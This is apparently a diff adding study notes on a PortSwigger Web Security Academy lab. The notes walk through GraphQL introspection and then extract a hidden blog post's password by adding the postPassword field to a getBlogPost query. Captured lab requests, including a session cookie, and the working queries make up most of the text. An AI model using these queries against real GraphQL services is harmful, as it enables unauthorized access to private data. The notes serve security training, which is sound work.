@@ -1077,7 +1077,110 @@ query { __typename }
 
 
 
+<details>
+  <summary>Lab: Accessing private GraphQL posts</summary>
 
+> ### The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 
+
+
+---
+
+1. active **``burp live passive Crawl``**
+
+<img width="400" height="168" alt="image" src="https://github.com/user-attachments/assets/1aabdb2e-2be3-419d-8f5e-5cbbf23f341b" />
+
+**``Found``**
+
+
+```http
+POST /graphql/v1 HTTP/2
+Host: 0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
+Cookie: session=6rY0h8IeXuTOu3Viib6k5KsJYOZNxku1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net/post?postId=2
+Content-Type: application/json
+Content-Length: 249
+Origin: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+
+
+
+{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }","operationName":"getBlogPost","variables":{"id":2}}
+```
+
+
+find introspection
+
+simple one to check
+
+<img width="1524" height="476" alt="image" src="https://github.com/user-attachments/assets/403cf877-4073-4ec6-becb-c926c3b227a0" />
+
+
+> Don't forget to convert form ``graphql`` to ``json`` 
+
+[From_graphql_2_json](https://datafetcher.com/graphql-json-body-converter)
+
+```json
+{
+
+  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
+
+}
+```
+
+<img width="1570" height="723" alt="image" src="https://github.com/user-attachments/assets/3104cd2c-b626-4eae-9ff3-f741a7135f57" />
+
+
+> ### put output to visulizer
+
+[graphql_visulaize3r](http://nathanrandal.com/graphql-visualizer/)
+
+
+<img width="848" height="657" alt="image" src="https://github.com/user-attachments/assets/40ebcb57-fe05-4ba5-906c-31ec3f82fb39" />
+
+
+Try to read content of ``postPassword`` of all posts
+
+```graphql
+query {
+  getAllBlogPosts {
+    id
+    title
+    postPassword
+  }
+}
+```
+
+but if you notice that there ar id form ``1`` to ``5`` exept **``3``** this might be it's ``isPrivate: Boolean!`` is true
+
+<img width="1527" height="622" alt="image" src="https://github.com/user-attachments/assets/6546c0c4-2f1a-4cac-990c-05e145d21c22" />
+
+so if i use the first query and try to see password 
+
+```json
+{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n     postPassword\n   }\n    }","operationName":"getBlogPost","variables":{"id":3
+
+}}
+```
+
+<img width="1544" height="651" alt="image" src="https://github.com/user-attachments/assets/e689a70d-8315-4412-9c87-b8d5aa85efd6" />
+
+
+found the password
+
+```
+
+```
+
+  
+</details>
 
 
 
